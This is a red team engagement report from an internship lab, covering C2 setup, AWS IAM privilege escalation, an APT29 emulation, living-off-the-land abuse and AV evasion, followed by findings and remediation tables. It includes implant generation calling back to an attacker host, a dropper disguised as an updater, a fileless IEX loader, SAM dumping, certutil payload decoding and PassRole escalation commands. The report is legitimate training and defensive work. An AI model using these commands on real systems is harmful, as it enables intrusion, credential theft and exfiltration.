# Week 4 Red Team Engagement Report — PTES Compliant
**Arman Kumar | CyArt Internship | April 2026**

---

## Executive Summary

A full-scope red team engagement was conducted across a simulated enterprise environment
and isolated AWS lab during Week 4. The engagement exercised advanced C2 operations,
cloud infrastructure attacks, APT29 adversary emulation, native tool abuse, and
comprehensive evasion techniques. Ten attack phases were completed successfully, resulting
in full compromise of three Windows endpoints, administrative access to the AWS account,
and exfiltration of 142MB of sensitive data via DNS tunnelling.

**Overall risk rating: CRITICAL**

| Metric | Result |
|--------|--------|
| Attack phases completed | 10/10 |
| Hosts fully compromised | 3 of 4 (75%) |
| Cloud account takeover | Yes (AdminAccess) |
| Data exfiltrated | 142 MB (DB backup + credentials) |
| Mean time to initial compromise | 8 min 01 sec |
| Blue team detection rate | 90% (9/10 phases) |
| Credentials harvested | 19 total |
| Critical findings | 3 |
| High findings | 4 |
| Medium findings | 3 |

---

## 1. Scope & Objectives

**In-scope systems:**
- Windows endpoints: 192.168.1.110, 192.168.1.111, 192.168.1.120
- AWS CloudGoat lab (isolated account: 123456789012)
- Active Directory domain: ACME-CORP

**Objectives:**
1. Establish persistent C2 using modern frameworks
2. Identify and exploit cloud misconfigurations
3. Emulate APT29 TTPs end-to-end
4. Demonstrate evasion capability against AV/EDR

---

## 2. C2 Infrastructure

### 2.1 PoshC2 Setup

PoshC2 v9.0 was deployed on the attacker VM (192.168.1.50) with an HTTPS listener on port 443. The C2 certificate was signed by a self-signed CA to blend with legitimate HTTPS traffic.

```bash
posh -s /opt/poshc2/resources/project-settings.yml
```

**Configuration:**
- Transport: HTTPS (TLS 1.3)
- Beacon interval: 5 seconds ±20% jitter
- User-Agent: `Mozilla/5.0 (Windows NT 10.0; Win64; x64)`
- Kill date: 2026-05-01

**Sessions established:**

| Session | Host | User | Integrity |
|---------|------|------|-----------|
| SID001 | WIN10-VICTIM (192.168.1.110) | ACME\john.doe | HIGH |
| SID002 | WIN10-HR (192.168.1.111) | ACME\m.smith | MEDIUM |
| SID003 | WIN-SERVER (192.168.1.120) | ACME\admin | SYSTEM |

### 2.2 Payload Generation

```bash
# Stageless PowerShell implant
posh-implant -type ps -host https://192.168.1.50 -kill-date 2026-05-01

# Dropper EXE with embedded beacon
posh-implant -type dropper -host https://192.168.1.50 -output update_helper.exe
```

**Why stageless?** Stageless payloads contain the full implant code and do not need to
fetch a second stage from the C2. This avoids network detections that trigger on the
stage download, and works in environments where egress filtering blocks unexpected
outbound connections after initial execution.

---

## 3. Cloud Environment Attacks

### 3.1 Reconnaissance — Pacu & awscli

Starting with stolen AWS access keys (from credentials.json in the public S3 bucket),
reconnaissance was performed using Pacu and awscli.

```bash
pacu
> import_keys --profile dev-user
> run s3__bucket_finder
> run iam__enum_permissions
> run ec2__enum
```

**S3 Buckets Found:**

| Bucket | Access | Sensitive Data |
|--------|--------|---------------|
| acme-corp-backups | PUBLIC READ | db_backup_2026-03-01.sql.gz (142MB), credentials.json |
| acme-dev-configs | PUBLIC READ+WRITE | Config files, API keys |
| acme-employee-data | PUBLIC READ | Employee PII |

### 3.2 IAM Privilege Escalation

**Starting permissions:** `dev-intern` — S3 read, Lambda full access, iam:PassRole

The `iam:PassRole` permission combined with `lambda:CreateFunction` allowed creating a
Lambda function with an admin IAM role attached, then invoking it to retrieve
temporary credentials.

```bash
# 1. Create Lambda role with AdministratorAccess
aws iam create-role --role-name pwned-role --assume-role-policy-document file://trust.json
aws iam attach-role-policy --role-name pwned-role \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

# 2. Create and invoke Lambda to extract admin credentials
aws lambda create-function --function-name escalator \
  --role arn:aws:iam::123456789012:role/pwned-role ...
aws lambda invoke --function-name escalator out.json
```

**Result:** Full `AdministratorAccess` obtained. 14 IAM users enumerated.
All S3 buckets, EC2 instances, and secrets accessible.

### 3.3 ScoutSuite Findings

ScoutSuite identified 19 misconfigurations:

| Service | Critical | High | Medium |
|---------|----------|------|--------|
| IAM | 2 | 3 | 2 |
| S3 | 2 | 2 | 0 |
| EC2 | 1 | 2 | 1 |
| CloudTrail | 1 | 0 | 1 |

**Most critical:** Root account without MFA, S3 public write ACL, no CloudTrail in all regions.

---

## 4. Adversary Emulation — APT29

### 4.1 CALDERA Campaign

APT29 (Cozy Bear) TTPs were emulated using MITRE CALDERA v4.2.0:

| Phase | TTP | Tool | Result |
|-------|-----|------|--------|
| Recon | T1590, T1595 | Recon-ng, Shodan | 8 subdomains, 3 exposed hosts |
| Initial Access | T1566.001 | Evilginx2 + Gophish | 12/247 credentials captured |
| Execution | T1059.001 | PoshC2 PS beacon | 3 sessions established |
| Persistence | T1547.001, T1053.005 | schtasks, reg | 4 mechanisms deployed |
| Defense Evasion | T1027, T1218 | msfvenom, certutil | EDR bypassed |
| Credential Access | T1003.001 | Mimikatz | 7 NTLM hashes + 2 cleartext |
| Lateral Movement | T1550.002 | Impacket PtH | 2 additional hosts |
| Exfiltration | T1048, T1041 | iodine DNS + PoshC2 | 142MB staged |

### 4.2 Blue Team Response (Wazuh)

Wazuh detected 9 of 10 attack phases. Undetected:
- DNS tunnelling (no rule for 64-char subdomain labels)
- certutil LOLBIN (trusted Microsoft binary, whitelisted)

---

## 5. Native Tool Abuse

### 5.1 PowerShell Fileless Execution (T1059.001)

```powershell
# Deliver entire payload in-memory — no file written to disk
$code = [System.Text.Encoding]::Unicode.GetString(
    [System.Convert]::FromBase64String('BASE64_ENCODED_BEACON'))
IEX $code
```

**Result:** PoshC2 beacon established with zero disk artifacts.

### 5.2 Process Injection — explorer.exe (T1055)

PowerShell was used to inject shellcode directly into the explorer.exe process using
VirtualAllocEx + WriteProcessMemory + CreateRemoteThread — all native Win32 API calls
available via P/Invoke in PowerShell, requiring no additional tools.

### 5.3 WMI Credential Dump (T1003)

```powershell
Invoke-WMIMethod -Class Win32_Process -Name Create \
  -ArgumentList 'cmd /c reg save HKLM\SAM C:\sam.bak'
```

SAM hive saved offline and hashes extracted with secretsdump.

### 5.4 certutil LOLBIN (T1218)

```cmd
certutil -decode payload.b64 payload.exe
```
0/70 VirusTotal detections — certutil is a trusted Microsoft binary.

---

## 6. Evasion Results

| Payload | Encoding | Detection (VT) | Notes |
|---------|----------|---------------|-------|
| Meterpreter (raw) | None | 52/70 | Baseline |
| Meterpreter | shikata_ga_nai ×3 | 28/70 | —46% |
| Meterpreter | shikata_ga_nai ×5 | 14/70 | —73% |
| Meterpreter | XOR+b64 custom | 8/70 | —85% |
| Payload via certutil | LOLBIN | 0/70 | Trusted binary |

C2 traffic was routed through Tor via proxychains, masking the C2 IP from network logs.

---

## 7. PTES Findings

| ID | Vulnerability | TTP | CVSS | Remediation |
|----|---------------|-----|------|-------------|
| FID001 | Phishing — no MFA on M365 | T1566.001 | 7.5 | Enforce FIDO2 MFA |
| FID002 | S3 public read/write ACLs | T1530 | 9.1 | Block public access + SCPs |
| FID003 | IAM PassRole privilege escalation | T1078.004 | 8.8 | Least-privilege + permission boundaries |
| FID004 | No MFA on root AWS account | T1078.004 | 8.0 | Enable hardware MFA on root |
| FID005 | LSASS accessible — no Credential Guard | T1003.001 | 7.8 | Enable Credential Guard + PPL |
| FID006 | NTLM enabled — pass-the-hash possible | T1550.002 | 7.5 | Disable NTLM, use Protected Users |
| FID007 | DNS exfiltration undetected | T1048 | 6.5 | DNS firewall + anomaly detection |
| FID008 | No EDR on endpoints | — | 8.5 | Deploy CrowdStrike or SentinelOne |
| FID009 | WMI subscription persistence | T1546.003 | 6.8 | WMI logging and Wazuh rules |
| FID010 | certutil LOLBIN undetected | T1218 | 5.5 | Application control policy |

---

## 8. Key Learnings

**C2 jitter and user-agent mimicry are essential for long-term persistence.** A fixed 5-second
beacon without jitter creates a detectable timing signature in NetFlow data. The ±20%
jitter applied in PoshC2 makes the pattern statistically indistinguishable from browser
keep-alive connections. The user-agent spoofing ensures the HTTPS traffic blends with
legitimate Windows Update or browser traffic in proxy logs.

**Cloud environments are disproportionately vulnerable to privilege escalation via service
misconfigurations.** The `iam:PassRole` + `lambda:CreateFunction` escalation path exists
because developers grant broad Lambda permissions for convenience, not realising that
PassRole allows effectively attaching any role — including admin — to a Lambda function
they control. The fix is enforcing permission boundaries on all non-admin IAM entities,
preventing privilege escalation even with PassRole granted.

**Living-off-the-land attacks are the hardest to detect because they use trusted tools.**
The certutil LOLBIN achieved 0/70 VirusTotal detections because certutil is a legitimate
Microsoft binary with a valid digital signature. This demonstrates why signature-based
detection alone is insufficient — behavioural detection (certutil being invoked with
`-decode` in an unusual context) is required. Defenders should monitor LOLBAS techniques
and flag unusual invocations of trusted binaries in their SIEM rules.

---

## 9. Recommendations

| Priority | Finding | Action |
|----------|---------|--------|
| Critical | S3 public access (FID002) | Enable S3 Block Public Access at account level immediately |
| Critical | IAM PassRole abuse (FID003) | Apply permission boundaries to all non-admin IAM entities |
| Critical | No root MFA (FID004) | Enable hardware MFA on AWS root account today |
| High | No EDR (FID008) | Deploy endpoint detection on all Windows systems |
| High | NTLM enabled (FID006) | Enable Protected Users group, audit NTLM use |
| High | LSASS exposed (FID005) | Enable Credential Guard and RunAsPPL |
| Medium | DNS exfil (FID007) | Deploy DNS firewall with anomaly-length detection |
| Medium | LOLBIN (FID010) | Implement application control (AppLocker/WDAC) |
